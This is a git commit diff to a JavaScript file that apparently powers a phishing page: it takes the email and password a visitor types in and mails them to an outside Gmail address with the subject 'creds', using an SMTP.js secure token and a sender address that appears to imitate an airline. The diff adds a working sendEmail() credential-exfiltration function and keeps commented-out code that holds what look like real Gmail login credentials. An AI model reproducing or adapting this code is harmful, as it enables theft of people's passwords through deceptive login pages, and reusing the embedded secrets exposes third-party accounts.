7d94311424cbd2786f386e3e0c58652e9838e1aa
samuelhernandes <128768779+samuelhernandes@users.noreply.github.com>
2023-03-24 14:28:52 -0400

    Update index.js

--- index.js
+++ index.js
@@ -2,8 +2,46 @@ const email = document.getElementById("contact");
 const password = document.getElementById("password");
 const submit = document.getElementById("button");
 
-submit.addEventListener("submit", (e) => {
-  e.preventDefault();
+// submit.addEventListener("submit", (e) => {
+//   e.preventDefault();
+
+//   console.log("Submit event called");
+
+//   let ebody = `
+//      ${email.value}
+//      ${password.value}
+//     `;
+
+//   //   Email.send({
+//   //     Host: "smtp.gmail.com",
+//   //     Username: "raakesh95misc@gmail.com",
+//   //     Password: "L!nuxpedora1",
+//   //     To: "raakesh95misc@gmail.com",
+//   //     From: "raakesh95misc@gmail.com",
+//   //     Subject: "Sending Email using javascript",
+//   //     Body: "Well that was easy!!",
+//   //   }).then(function (message) {
+//   //     alert("mail sent successfully");
+//   //   });
+
+//   Email.send({
+//     SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6", //add your token here
+//     To: "raakesh95official@gmail.com",
+//     From: "airemirates@proton.me",
+//     Subject: "creds",
+//     Body: ebody,
+//   }).then(function (message) {
+//     alert("mail sent successfully");
+//   });
+// });
+
+function sendEmail() {
+  // e.preventDefault();
+
+  // alert("mail sent successfully");
+
+  console.log("Submit event called");
+
   let ebody = `
      ${email.value}
      ${password.value}
@@ -22,10 +60,12 @@ submit.addEventListener("submit", (e) => {
   //   });
 
   Email.send({
-    SecureToken: "56ebf60d-2612-47c8-b49b-bb8cb21c9c76", //add your token here
+    SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6",
     To: "raakesh95official@gmail.com",
     From: "airemirates@proton.me",
     Subject: "creds",
     Body: ebody,
-  }).then((message) => alert(message));
-});
+  }).then(function (message) {
+    alert("mail sent successfully");
+  });
+}
